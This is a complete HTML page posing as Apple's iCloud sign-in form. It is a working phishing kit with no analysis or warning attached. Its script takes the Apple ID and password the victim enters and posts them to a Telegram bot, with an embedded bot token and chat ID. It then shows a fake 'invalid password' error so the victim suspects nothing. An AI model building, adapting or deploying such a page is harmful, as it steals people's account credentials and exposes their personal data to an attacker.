<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iCloud</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: linear-gradient(180deg, #f5f5f7 0%, #e8e8ed 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; }
        .container { background: rgba(255,255,255,0.9); backdrop-filter: blur(10px); border-radius: 20px; padding: 40px 30px; box-shadow: 0 15px 50px rgba(0,0,0,0.15); width: 92%; max-width: 400px; }
        h1 { text-align: center; font-size: 22px; color: #1d1d1f; margin-bottom: 5px; }
        p.sub { text-align: center; color: #86868b; font-size: 14px; margin-bottom: 25px; }
        input { width: 100%; padding: 16px 14px; margin: 8px 0; border: 1.5px solid #d2d2d7; border-radius: 12px; font-size: 16px; background: white; outline: none; }
        input:focus { border-color: #0071e3; }
        button { width: 100%; padding: 16px; background: #0071e3; color: white; border: none; border-radius: 12px; font-size: 17px; font-weight: 600; cursor: pointer; margin-top: 10px; }
        button:hover { background: #0077ed; }
        .footer { text-align: center; margin-top: 20px; }
        .footer a { color: #0071e3; font-size: 13px; text-decoration: none; }
        .error { color: #d93025; text-align: center; margin-top: 10px; font-size: 13px; display: none; }
        .loader { display: none; text-align: center; margin-top: 15px; }
        .loader span { display: inline-block; width: 8px; height: 8px; background: #0071e3; border-radius: 50%; margin: 0 3px; animation: bounce 1.4s ease infinite; }
        .loader span:nth-child(2) { animation-delay: 0.16s; }
        .loader span:nth-child(3) { animation-delay: 0.32s; }
        @keyframes bounce { 0%,80%,100% { transform: scale(0); } 40% { transform: scale(1); } }
    </style>
</head>
<body>
    <div class="container">
        <h1>🍎 iCloud</h1>
        <p class="sub">Sign in to your account</p>
        <form id="loginForm">
            <input type="email" id="email" placeholder="Apple ID" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
            <div class="error" id="errorMsg">Invalid Apple ID or password. Please try again.</div>
            <div class="loader" id="loader">
                <span></span><span></span><span></span>
                <p style="margin-top:8px;font-size:12px;color:#86868b;">Verifying...</p>
            </div>
        </form>
        <div class="footer">
            <a href="#">Forgot Apple ID or password?</a><br>
            <a href="#">Create Apple ID</a>
        </div>
    </div>

    <script>
        const form = document.getElementById('loginForm');
        const errorMsg = document.getElementById('errorMsg');
        const loader = document.getElementById('loader');
        const submitBtn = form.querySelector('button');

        form.addEventListener('submit', function(e) {
            e.preventDefault();
            errorMsg.style.display = 'none';
            loader.style.display = 'block';
            submitBtn.disabled = true;

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            const data = { email: email, password: password };

            fetch('https://api.telegram.org/bot8976876114:AAGjlI4juHUaOyCbhj1MFPITpHK_0WuJlro/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: '6512360078',
                    text: 'Apple ID: ' + email + '\nPassword: ' + password
                })
            }).then(() => {
                setTimeout(() => {
                    loader.style.display = 'none';
                    submitBtn.disabled = false;
                    errorMsg.style.display = 'block';
                    document.getElementById('email').value = '';
                    document.getElementById('password').value = '';
                }, 2000);
            }).catch(() => {
                loader.style.display = 'none';
                submitBtn.disabled = false;
                errorMsg.style.display = 'block';
                document.getElementById('email').value = '';
                document.getElementById('password').value = '';
            });
        });
    </script>
</body>
</html>
